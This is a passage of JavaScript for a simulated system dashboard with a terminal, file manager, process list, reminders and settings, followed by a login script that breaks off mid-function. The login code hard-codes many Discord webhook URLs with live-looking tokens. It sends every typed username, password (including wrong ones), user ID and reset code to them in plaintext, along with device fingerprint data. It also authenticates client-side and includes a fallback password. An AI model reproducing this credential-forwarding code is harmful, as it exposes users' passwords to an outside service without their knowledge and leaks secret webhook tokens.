          notificationArea.prepend(notificationElement); // Add to the top of the list

          // Auto-dismiss after duration
          setTimeout(() => {
              this.closeNotification(notificationId);
          }, duration);
          
          console.log(`Notification added: "${message}" (Type: ${type})`);
      },

      closeNotification: function(id) {
          const notification = document.getElementById(id);
          if (notification) {
              notification.remove();
              console.log(`Notification closed: ${id}`);
          }
      },

      // --- System Monitor Logic ---
      initSystemMonitor: function() {
          this.monitorInterval = setInterval(() => this.updateSystemMonitor(), 3000); // Update every 3 seconds
          this.updateSystemMonitor(); // Initial update
          console.log("System monitor initialized.");
      },
      updateSystemMonitor: function() {
          const cpu1 = Math.floor(Math.random() * 60) + 10; // 10-70%
          const cpu2 = Math.floor(Math.random() * 60) + 10;
          const cpuTotal = Math.floor((cpu1 + cpu2) / 2);

          const ramTotalGB = 16;
          const ramUsedGB = Math.floor(Math.random() * ramTotalGB * 0.8) + 1; // 1GB to 80% of RAM
          const ramFreeGB = ramTotalGB - ramUsedGB;
          const ramUsedPercent = (ramUsedGB / ramTotalGB) * 100;

          const diskCUsedPercent = Math.floor(Math.random() * 70) + 20; // 20-90%
          const diskDUsedPercent = Math.floor(Math.random() * 50) + 10; // 10-60%

          const netDown = Math.floor(Math.random() * 90) + 10; // 10-100 Mbps
          const netUp = Math.floor(Math.random() * 40) + 5; // 5-45 Mbps

          // Update UI elements
          this.updateMonitorBar('cpu1', cpu1, `${cpu1}%`);
          this.updateMonitorBar('cpu2', cpu2, `${cpu2}%`);
          this.updateMonitorBar('cpu_total', cpuTotal, `${cpuTotal}%`);

          this.updateMonitorBar('ram_total', ramTotalGB * 1000, `${ramTotalGB} GB`); // Use MB for consistency internally
          this.updateMonitorBar('ram_used', ramUsedGB * 1000, `${ramUsedGB} GB`);
          this.updateMonitorBar('ram_free', ramFreeGB * 1000, `${ramFreeGB} GB`);

          this.updateMonitorBar('disk_c', diskCUsedPercent, `${diskCUsedPercent}%`);
          this.updateMonitorBar('disk_d', diskDUsedPercent, `${diskDUsedPercent}%`);

          this.updateMonitorBar('net_down', netDown, `${netDown} Mbps`);
          this.updateMonitorBar('net_up', netUp, `${netUp} Mbps`);
      },
      updateMonitorBar: function(metric, value, labelText) {
          const bar = document.querySelector(`.progress-bar[data-metric="${metric}"]`);
          const label = bar.closest('.monitor-box').querySelector(`.progress-bar-label span:last-child`);
          
          if (bar && label) {
              let percentage = 0;
              if (metric.startsWith('cpu') || metric.startsWith('disk')) {
                  percentage = value;
              } else if (metric === 'ram_total') {
                  // For total RAM, we don't typically fill the bar, just update label
                  return; 
              } else if (metric === 'ram_used') {
                  const totalRamMb = parseFloat(document.querySelector(`.progress-bar[data-metric="ram_total"]`).closest('.monitor-bar-label').querySelector('span:last-child').innerText.replace(' GB', '')) * 1000;
                  percentage = (value / totalRamMb) * 100;
              } else if (metric.startsWith('net')) {
                  // For network, the bar is illustrative, use value directly
                  percentage = value; 
              }

              bar.style.width = `${percentage}%`;
              label.innerText = labelText;
          }
      },

      // --- Terminal Logic ---
      initTerminal: function() {
          const terminalInput = document.getElementById('terminalInput');
          const terminalOutput = document.getElementById('terminalOutput');

          const commands = {
              help: () => {
                  return `Available commands:\n` +
                         `  help: Displays this help message.\n` +
                         `  clear: Clears the terminal screen.\n` +
                         `  sysinfo: Displays system information.\n` +
                         `  ps: Lists running processes (simulated).\n` +
                         `  notes: Opens the notes canvas.\n` +
                         `  man [command]: Shows manual for a command (limited).\n` +
                         `  echo [text]: Prints text back to the terminal.\n` +
                         `  cd [directory]: Change directory (simulated).\n` +
                         `  ls: List directory contents (simulated).\n` +
                         `  status: Show current system status.`;
              },
              clear: () => {
                  terminalOutput.innerHTML = '';
                  return '';
              },
              sysinfo: () => {
                  const user = document.getElementById('loggedInUser').textContent;
                  const userId = document.getElementById('loggedInID').textContent;
                  const os = navigator.platform;
                  const browser = navigator.userAgent;
                  return `System Information:\n` +
                         `  Hostname: PrivateSystem\n` +
                         `  OS: ${os}\n` +
                         `  Browser: ${browser}\n` +
                         `  User: ${user} (ID: ${userId})\n` +
                         `  Kernel: Linux 5.15.0-76-generic (Simulated)`;
              },
              ps: () => {
                  // Simulate some processes
                  const processes = [
                      { pid: 1, name: 'systemd', cpu: '0.5%', mem: '15MB', status: 'Running' },
                      { pid: 123, name: 'dashboard-gui', cpu: '5.2%', mem: '120MB', status: 'Running' },
                      { pid: 456, name: 'chrome', cpu: '2.1%', mem: '250MB', status: 'Running' },
                      { pid: 789, name: 'security-monitor', cpu: '1.8%', mem: '50MB', status: 'Running' },
                      { pid: 101, name: 'process-manager', cpu: '0.1%', mem: '10MB', status: 'Running' },
                      { pid: 102, name: 'network-service', cpu: '0.3%', mem: '25MB', status: 'Running' },
                  ];
                  let output = "  PID\tNAME\t\tCPU %\tMEMORY\tSTATUS\n";
                  processes.forEach(p => {
                      output += `  ${p.pid}\t${p.name}\t\t${p.cpu}\t${p.mem}\t${p.status}\n`;
                  });
                  return output;
              },
              notes: () => {
                  document.getElementById('notesBtn').click(); // Trigger notes button click
                  return "Opening notes canvas...";
              },
              man: (cmd) => {
                  if (!cmd) return "Usage: man [command]";
                  if (commands[cmd]) {
                      return `Manual for "${cmd}":\n${commands[cmd]()}`;
                  } else {
                      return `No manual entry for "${cmd}".`;
                  }
              },
              echo: (...args) => args.join(' '),
              cd: (dir = '~') => {
                  if (dir === '~') return "Changed directory to home folder.";
                  if (dir === '/' || dir === '/root') return `Changed directory to ${dir}.`;
                  return `Cannot change directory to "${dir}". Directory not found or not supported.`;
              },
              ls: () => {
                  // Simulate directory contents
                  const currentDir = terminalInput.dataset.currentDir || '/';
                  if (currentDir === '/') return "  bin/\tdev/\tlib/\tusr/\tvmlinuz\n  boot/\tetc/\tmedia/\tsys/\t";
                  if (currentDir === '/bin') return "  bash\tcat\techo\tls\tman\t";
                  return "Directory listing not available for this path.";
              },
              status: () => {
                  const uptime = "2 days, 15h 30m";
                  const loadAvg = "0.50 0.65 0.70";
                  const diskC = document.querySelector(`.progress-bar[data-metric="disk_c"]`).style.width;
                  const ramUsed = document.querySelector(`.progress-bar[data-metric="ram_used"]`).style.width;
                  return `System Status:\n` +
                         `  Uptime: ${uptime}\n` +
                         `  Load Average: ${loadAvg}\n` +
                         `  Disk C: ${diskC}\n` +
                         `  RAM Used: ${ramUsed}`;
              }
          };

          const addTerminalLine = (text, isError = false) => {
              const line = document.createElement('div');
              line.textContent = text;
              if (isError) line.style.color = '#e74c3c'; // Red for errors
              terminalOutput.appendChild(line);
              terminalOutput.scrollTop = terminalOutput.scrollHeight; // Auto-scroll
          };

          terminalInput.addEventListener('keydown', (e) => {
              if (e.key === 'Enter') {
                  const commandLine = terminalInput.value.trim();
                  terminalInput.value = ''; // Clear input
                  addTerminalLine(`user@system:~$ ${commandLine}`); // Echo command

                  if (!commandLine) return; // Ignore empty commands

                  const parts = commandLine.split(' ');
                  const commandName = parts[0].toLowerCase();
                  const args = parts.slice(1);

                  if (commands[commandName]) {
                      try {
                          const result = commands[commandName](...args);
                          addTerminalLine(result);
                      } catch (error) {
                          addTerminalLine(`Error executing command: ${error.message}`, true);
                      }
                  } else {
                      addTerminalLine(`Command not found: ${commandName}. Type 'help' for a list of commands.`, true);
                  }
              }
          });
          console.log("Terminal functionality initialized.");
      },

      // --- File Manager Logic ---
      initFileManager: function() {
          const fileListRoot = document.getElementById('fileListRoot');
          const filePreview = document.getElementById('filePreview');

          // Simulate file structure
          const fileStructure = {
              '/': {
                  type: 'folder',
                  children: {
                      'bin': { type: 'folder', children: { 'bash': { type: 'file', content: 'Simulated shell executable' } } },
                      'etc': { type: 'folder', children: { 'hosts': { type: 'file', content: '127.0.0.1 localhost\n::1 localhost' } } },
                      'home': { type: 'folder', children: { 'user': { type: 'folder', children: { 'documents': { type: 'folder', children: {} }, 'notes.txt': { type: 'file', content: 'Remember to finish the dashboard updates!' } } } } },
                      'System.log': { type: 'file', content: 'System boot log...' },
                      'config.sys': { type: 'file', content: 'System configuration settings...' }
                  }
              }
          };

          const renderFileList = (container, path, structure) => {
              container.innerHTML = ''; // Clear existing
              const currentPathParts = path.split('/').filter(p => p);
              let currentLevel = fileStructure['/'];

              // Navigate to the correct directory in the structure
              for (const part of currentPathParts) {
                  if (currentLevel && currentLevel.children && currentLevel.children[part]) {
                      currentLevel = currentLevel.children[part];
                  } else {
                      return; // Path invalid
                  }
              }

              // Render parent folder link
              const parentPath = path === '/' ? '/' : path.substring(0, path.lastIndexOf('/')) || '/';
              const parentListItem = document.createElement('li');
              parentListItem.className = 'folder';
              parentListItem.innerHTML = `<i class="fas fa-level-up-alt"></i> ..`;
              parentListItem.dataset.path = parentPath;
              parentListItem.addEventListener('click', (e) => {
                  e.stopPropagation(); // Prevent triggering event on parent folder
                  renderFileList(container, parentPath, fileStructure);
                  this.addNotification(`Navigated to ${parentPath}`, 'info');
              });
              container.appendChild(parentListItem);

              // Render files and folders
              if (currentLevel && currentLevel.children) {
                  Object.entries(currentLevel.children).sort(([,a],[,b]) => { // Sort folders first, then files
                      if (a.type === 'folder' && b.type !== 'folder') return -1;
                      if (a.type !== 'folder' && b.type === 'folder') return 1;
                      return a.name > b.name ? 1 : -1;
                  }).forEach(([name, item]) => {
                      const listItem = document.createElement('li');
                      const itemPath = path === '/' ? `/${name}` : `${path}/${name}`;
                      
                      listItem.dataset.path = itemPath;
                      if (item.type === 'folder') {
                          listItem.className = 'folder';
                          listItem.innerHTML = `<i class="fas fa-folder"></i> ${name}`;
                          listItem.addEventListener('click', (e) => {
                              e.stopPropagation(); // Prevent triggering event on parent folder
                              renderFileList(container, itemPath, fileStructure);
                              this.addNotification(`Opened folder: ${name}`, 'info');
                          });
                      } else { // file
                          listItem.className = 'file';
                          listItem.innerHTML = `<i class="fas fa-file"></i> ${name}`;
                          listItem.addEventListener('click', (e) => {
                              e.stopPropagation();
                              renderFilePreview(name, item.content);
                              this.addNotification(`Selected file: ${name}`, 'info');
                          });
                      }
                      container.appendChild(listItem);
                  });
              }
          };

          const renderFilePreview = (name, content) => {
              filePreview.textContent = content;
              filePreview.style.cssText = 'background-color: #3a3a3a; color: #f9f2dc; padding: 15px; border-radius: 8px; border: 1px solid #ff914d;'; // Style preview area
              if (document.body.classList.contains('light-theme')) {
                   filePreview.style.cssText = 'background-color: #fff3cc; color: #994d00; padding: 15px; border-radius: 8px; border: 1px solid #994d00;';
              }
              this.addNotification(`Previewing file: ${name}`, 'info');
          };

          // Initial render
          renderFileList(fileListRoot, '/', fileStructure);
          console.log("File manager initialized.");
      },

      // --- Process Manager Logic ---
      initProcessManager: function() {
          this.processManagerInterval = setInterval(() => this.updateProcessList(), 4000); // Update every 4 seconds
          this.updateProcessList(); // Initial population
          console.log("Process manager initialized.");
      },
      updateProcessList: function() {
          const tbody = document.getElementById('processTableBody');
          tbody.innerHTML = ''; // Clear existing

          const pids = new Set(); // To ensure unique PIDs

          for (let i = 0; i < Math.floor(Math.random() * 15) + 5; i++) { // 5-20 processes
              let pid;
              do {
                  pid = Math.floor(Math.random() * 10000);
              } while (pids.has(pid));
              pids.add(pid);

              const processName = ['chrome', 'firefox', 'code', 'system', 'explorer', 'winlogon', 'svchost', 'update-agent', 'security-daemon', 'audio-srv', 'network-manager', 'terminal-emu', 'file-explorer', 'process-viewer', 'reminder-app', 'monitor-daemon', 'file-manager'][Math.floor(Math.random() * 17)];
              const cpu = (Math.random() * 5).toFixed(1);
              const mem = `${Math.floor(Math.random() * 200) + 10}MB`;
              const status = ['Running', 'Suspended', 'Idle'][Math.floor(Math.random() * 3)];

              const row = tbody.insertRow();
              row.innerHTML = `
                  <td>${pid}</td>
                  <td>${processName}</td>
                  <td>${cpu}%</td>
                  <td>${mem}</td>
                  <td>${status}</td>
                  <td><button onclick="dashboard.killProcess(${pid})">Kill</button></td>
              `;
          }
      },
      killProcess: function(pid) {
          this.addNotification(`Simulating kill signal for process PID ${pid}.`, 'warning');
          // In a real scenario, this would interact with a backend.
          // For simulation, we can just remove it or mark it.
          const rowToKill = Array.from(document.querySelectorAll('#processTableBody tr')).find(row => row.cells[0].textContent == pid);
          if (rowToKill) {
              rowToKill.cells[4].textContent = 'Terminating';
              setTimeout(() => rowToKill.remove(), 1000);
          }
      },

      // --- Reminders Logic ---
      initReminders: function() {
          this.reminders = this.loadReminders(); // Load from storage or default
          this.renderReminders();

          const addBtn = document.getElementById('addReminderBtn');
          const reminderText = document.getElementById('reminderText');
          const reminderDateTime = document.getElementById('reminderDateTime');

          addBtn.addEventListener('click', () => {
              const text = reminderText.value.trim();
              const dateTime = reminderDateTime.value;

              if (!text || !dateTime) {
                  this.addNotification('Please enter reminder text and date/time.', 'warning');
                  return;
              }

              const newReminder = {
                  id: `rem-${Date.now()}`,
                  text: text,
                  dateTime: new Date(dateTime).getTime(),
                  completed: false
              };
              this.reminders.push(newReminder);
              this.saveReminders();
              this.renderReminders();
              reminderText.value = '';
              reminderDateTime.value = '';
              this.addNotification(`Reminder added: "${text}"`, 'success');
          });
          console.log("Reminders system initialized.");
      },
      loadReminders: function() {
          const storedReminders = localStorage.getItem('dashboardReminders');
          if (storedReminders) {
              const reminders = JSON.parse(storedReminders);
              // Ensure dateTime is a number
              return reminders.map(rem => ({ ...rem, dateTime: Number(rem.dateTime) }));
          }
          // Default reminders if none stored
          return [
              { id: 'rem-1', text: 'Check system logs', dateTime: new Date(Date.now() + 1000 * 60 * 60 * 3).getTime(), completed: false }, // 3 hours from now
              { id: 'rem-2', text: 'Review security alerts', dateTime: new Date(Date.now() + 1000 * 60 * 60 * 8).getTime(), completed: false } // 8 hours from now
          ];
      },
      saveReminders: function() {
          localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
      },
      renderReminders: function() {
          const reminderList = document.getElementById('reminderList');
          reminderList.innerHTML = ''; // Clear existing

          // Sort reminders by time, upcoming first
          this.reminders.sort((a, b) => a.dateTime - b.dateTime);

          this.reminders.forEach(reminder => {
              const item = document.createElement('div');
              item.className = 'reminder-item';
              if (reminder.completed) item.style.textDecoration = 'line-through';
              item.innerHTML = `
                  <div class="reminder-text">${reminder.text}</div>
                  <div class="reminder-time">${new Date(reminder.dateTime).toLocaleString()}</div>
                  <button onclick="dashboard.toggleReminderComplete('${reminder.id}')"><i class="fas fa-check"></i></button>
              `;
              reminderList.appendChild(item);
          });
      },
      toggleReminderComplete: function(id) {
          const reminder = this.reminders.find(r => r.id === id);
          if (reminder) {
              reminder.completed = !reminder.completed;
              this.saveReminders();
              this.renderReminders();
              this.addNotification(`Reminder "${reminder.text}" marked as ${reminder.completed ? 'complete' : 'incomplete'}.`, 'success');
          }
      },

      // --- Advanced Tools Logic ---
      runTool: function(toolName) {
          this.addNotification(`Launching ${toolName}...`, 'info');
          let message = `Simulating execution of '${toolName}'.`;
          switch(toolName) {
              case 'securityScanner':
                  message = "Security scan initiated. Analyzing system integrity...";
                  setTimeout(() => this.addNotification("Security scan found no critical vulnerabilities.", 'success'), 2000);
                  break;
              case 'networkAnalyzer':
                  message = "Network analysis in progress. Checking ping and packet loss...";
                  setTimeout(() => this.addNotification("Network diagnostics nominal. Latency is low.", 'success'), 2000);
                  break;
              case 'automationSuite':
                  message = "Automation suite loading. Ready for task configuration.";
                  break;
              case 'documentManager':
                  message = "Document manager opened. Organizing files...";
                  break;
              case 'virtualMachine':
                  message = "Virtual machine environment initialized. Welcome to the sandbox.";
                  break;
              default:
                  message = `Tool "${toolName}" is not fully implemented yet.`;
          }
          // Display message in terminal if visible, otherwise notification
          const terminalOutput = document.getElementById('terminalOutput');
          if (document.getElementById('terminalSection').classList.contains('active')) {
              terminalOutput.innerHTML += `\nSimulating tool launch: ${message}\n`;
              terminalOutput.scrollTop = terminalOutput.scrollHeight;
          } else {
              this.addNotification(message, 'info');
          }
      },

      // --- Settings Logic ---
      initSettings: function() {
          const settingsThemeToggle = document.getElementById('settingsThemeToggle');
          const settingsSoundToggle = document.getElementById('settingsSoundToggle');
          const settingsAutoHide = document.getElementById('settingsAutoHide');
          const settingsZoomLevel = document.getElementById('settingsZoomLevel');
          const settingsThemeColor = document.getElementById('settingsThemeColor');
          const clearAllLogsBtn = document.getElementById('clearAllLogsBtn');

          // Load settings from localStorage
          settingsThemeToggle.checked = localStorage.getItem('dashboardTheme') === 'light';
          settingsSoundToggle.checked = localStorage.getItem('notificationSounds') !== 'disabled'; // Default enabled
          settingsAutoHide.checked = localStorage.getItem('autoHidePanels') === 'true';
          settingsZoomLevel.value = localStorage.getItem('dashboardZoom') || 1;
          settingsThemeColor.value = localStorage.getItem('dashboardAccentColor') || '#ff914d';

          // Apply initial settings
          document.body.classList.toggle('light-theme', settingsThemeToggle.checked);
          document.body.style.zoom = settingsZoomLevel.value;
          this.updateAccentColor(settingsThemeColor.value);

          // Event Listeners
          settingsThemeToggle.addEventListener('change', () => {
              const isLight = settingsThemeToggle.checked;
              document.body.classList.toggle('light-theme', isLight);
              localStorage.setItem('dashboardTheme', isLight ? 'light' : 'dark');
              this.addNotification(`Theme set to ${isLight ? 'Light' : 'Dark'} mode.`, 'info');
          });

          settingsSoundToggle.addEventListener('change', () => {
              const enableSounds = settingsSoundToggle.checked;
              localStorage.setItem('notificationSounds', enableSounds ? 'enabled' : 'disabled');
              this.addNotification(`Notification sounds are now ${enableSounds ? 'enabled' : 'disabled'}.`, 'info');
          });

          settingsAutoHide.addEventListener('change', () => {
              const autoHide = settingsAutoHide.checked;
              localStorage.setItem('autoHidePanels', autoHide);
              this.addNotification(`Panels will now ${autoHide ? 'auto-hide' : 'remain visible'} when not active.`, 'info');
          });

          settingsZoomLevel.addEventListener('change', () => {
              const zoom = settingsZoomLevel.value;
              document.body.style.zoom = zoom;
              localStorage.setItem('dashboardZoom', zoom);
              this.addNotification(`Default zoom level set to ${Math.round(zoom * 100)}%.`, 'info');
          });

          settingsThemeColor.addEventListener('change', () => {
              const color = settingsThemeColor.value;
              this.updateAccentColor(color);
              localStorage.setItem('dashboardAccentColor', color);
              this.addNotification(`Accent color changed.`, 'info');
          });
          
          clearAllLogsBtn.addEventListener('click', () => {
              if (confirm('Are you sure you want to clear all local data (reminders, logs)? This cannot be undone.')) {
                  localStorage.removeItem('dashboardReminders');
                  localStorage.removeItem('dashboardTheme');
                  localStorage.removeItem('notificationSounds');
                  localStorage.removeItem('autoHidePanels');
                  localStorage.removeItem('dashboardZoom');
                  localStorage.removeItem('dashboardAccentColor');
                  
                  // Reset reminders in the app
                  this.reminders = [];
                  this.renderReminders();
                  
                  // Reset theme to default (dark)
                  document.body.classList.remove('light-theme');
                  document.getElementById('themeToggle').innerText = '🌙 Dark Mode';
                  settingsThemeToggle.checked = false;
                  document.body.style.zoom = 1;
                  settingsZoomLevel.value = 1;
                  this.updateAccentColor('#ff914d'); // Default accent
                  settingsThemeColor.value = '#ff914d';

                  this.addNotification('All local data cleared successfully.', 'success');
              }
          });

          console.log("Settings initialized.");
      },
      updateAccentColor: function(color) {
          // Update CSS variables or direct styles for accent color elements
          document.documentElement.style.setProperty('--accent-color', color); // Requires CSS variables, or target specific elements
          
          // Manually update some elements for demonstration
          const buttons = document.querySelectorAll('.sidebar-nav button, .quick-bar button, #canvasControls button, .tool-item button, .reminder-form button');
          buttons.forEach(btn => {
              if (!btn.id || btn.id !== 'panicBtn' && btn.id !== 'restartBtn') { // Avoid overriding special buttons
                  btn.style.backgroundColor = color;
                  // Add hover effect simulation or rely on CSS specific to color
              }
          });
          // Specific overrides for theme light/dark are handled by CSS class toggling
      },

      // --- Cleanup ---
      cleanup: function() {
        console.log("Cleaning up dashboard intervals...");
        if (this.sessionTimerInterval) clearInterval(this.sessionTimerInterval);
        if (this.clockInterval) clearInterval(this.clockInterval);
        if (this.monitorInterval) clearInterval(this.monitorInterval);
        if (this.processManagerInterval) clearInterval(this.processManagerInterval);
        console.log("Dashboard cleanup complete.");
      }
    };

    // --- Login System JavaScript ---
    (() => {
      // Placeholder for user data (replace with actual fetch or JSON data)
      // In a real application, this would be fetched from a server.
      // For simulation, we'll use a static list.
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json'; // Example URL

      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };
      
      // New webhooks for specific actions
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
        reset_attempt_detected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq',
        reset_attempt_success: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
        reset_attempt_failure: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = []; // Will be populated from JSON
      let loginTime = null;

      // Fetch user data once on load
      fetch(USER_JSON_URL)
        .then(response => {
          if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
          return response.json();
        })
        .then(data => {
          users = data;
          console.log(`Successfully loaded ${users.length} user profiles.`);
        })
        .catch(error => {
          console.error("Failed to load user data:", error);
          // Provide default or fallback user data if fetch fails
          users = [{ name: "Fallback User", username: "fallback", password: "password123", userID: "000000", rank: 1, role: "Guest" }];
          console.warn("Using fallback user data.");
        });

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Flash red outline animation for login box
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        loginBox.classList.add('flashing');
        const interval = setInterval(() => {
          if (count >= times) {
            loginBox.classList.remove('flashing');
            clearInterval(interval);
            return;
          }
          const currentBorderColor = loginBox.style.borderColor || 'white';
          loginBox.style.borderColor = currentBorderColor === 'red' ? '#ff914d' : 'red';
          loginBox.style.boxShadow = currentBorderColor === 'red' ? '0 0 25px rgba(255, 145, 77, 0.7), 0 0 10px rgba(0,0,0,0.5) inset' : '0 0 15px red';
          count++;
        }, delay);
      }

      // Get WebGL Renderer (for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch { return null; }
        }
        return null;
      }

      // Find user in loaded data
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // --- Embed builders for new webhook system ---
      function buildEmbed(title, color, fields) {
          return { title, color, fields, timestamp: new Date().toISOString() };
      }

      async function logSpecificAction(webhookUrl, embed) {
          await sendWebhook(webhookUrl, embed);
      }

      async function logUsername(name, username) {
          await logSpecificAction(loggingWebhooks.username, buildEmbed(
              "Username Logging", 0x3498db,
              [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }]
          ));
      }
      async function logPassword(name, password) {
          await logSpecificAction(loggingWebhooks.password, buildEmbed(
              "Password Logging", 0xe74c3c,
              [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }]
          ));
      }
      async function logIdentifier(name, identifier) {
          await logSpecificAction(loggingWebhooks.identifier, buildEmbed(
              "Identifier Logging", 0x2ecc71,
              [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }]
          ));
      }
      async function logInvalidUsername(name, username) {
          await logSpecificAction(loggingWebhooks.invalid_username, buildEmbed(
              "Invalid Username Logging", 0xf39c12,
              [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }]
          ));
      }
      async function logInvalidPassword(name, password) {
          await logSpecificAction(loggingWebhooks.invalid_password, buildEmbed(
              "Invalid Password Logging", 0xe74c3c,
              [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }]
          ));
      }
      async function logInvalidIdentifier(name, identifier) {
          await logSpecificAction(loggingWebhooks.invalid_identifier, buildEmbed(
              "Invalid Identifier Logging", 0xd35400,
              [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }]
          ));
      }
      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
          await logSpecificAction(loggingWebhooks.attempts_counter, buildEmbed(
              "Attempts Counter Logging", 0x9b59b6,
              [
                  { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
                  { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true },
                  { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }
              ]
          ));
      }
      async function logAttemptsExceeded(name, username, password, identifier) {
          await logSpecificAction(loggingWebhooks.attempts_exceeded, buildEmbed(
              "Attempts Exceeded Logging", 0xc0392b,
              [
                  { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
                  { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true },
                  { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }
              ]
          ));
      }
      async function logResetAttempt(name, username, password, identifier, enteredCode, success) {
          const url = success ? loggingWebhooks.reset_attempt_success : loggingWebhooks.reset_attempt_failure;
          const title = success ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt";
          const color = success ? 0x00ff00 : 0xff0000;
          await logSpecificAction(url, buildEmbed(
              title, color,
              [
                  { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
                  { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: identifier, inline: true },
                  { name: "Entered Code", value: enteredCode, inline: false }
              ]
          ));
      }
      async function logResetAttemptDetected(name, username, password, identifier, enteredCode) {
          await logSpecificAction(loggingWebhooks.reset_attempt_detected, buildEmbed(
              "🔔 Reset Box Detected", 0xffff00,
              [
                  { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
